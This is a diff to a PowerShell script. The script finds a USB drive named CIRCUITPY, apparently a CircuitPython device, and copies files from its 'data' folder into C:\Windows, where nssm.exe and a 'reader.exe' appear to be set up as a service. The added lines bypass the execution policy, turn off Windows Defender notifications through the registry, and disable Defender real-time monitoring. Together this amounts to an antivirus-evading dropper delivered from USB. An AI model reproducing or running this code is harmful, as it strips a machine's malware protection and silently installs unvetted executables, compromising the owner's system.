@@ -1,7 +1,13 @@
-$drive = Get-PSDrive | Where-Object { $_.Name -eq 'CIRCUITPY' }
 
-if ($drive) {
-    $sourcePath = Join-Path $drive.Root "data"
+PowerShell -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' -Name
+'DisableEnhancedNotifications' -Value 1"
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+$driveLetter = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.VolumeName -eq "CIRCUITPY" } | Select-Object -ExpandProperty DeviceID
+
+if ($driveLetter) {
+    $sourcePath = Join-Path $driveLetter "data"
     $destinationPath = "C:\Windows"
 
     if (Test-Path $sourcePath) {
@@ -19,7 +25,7 @@ if ($drive) {
             Write-Host "nssm.exe or reader.exe not found."
         }
     } else {
-        Write-Host "Source folder 'data' not found."
+        Write-Host "Source folder 'data' not found on CIRCUITPY drive."
     }
 } else {
     Write-Host "CIRCUITPY drive not found."
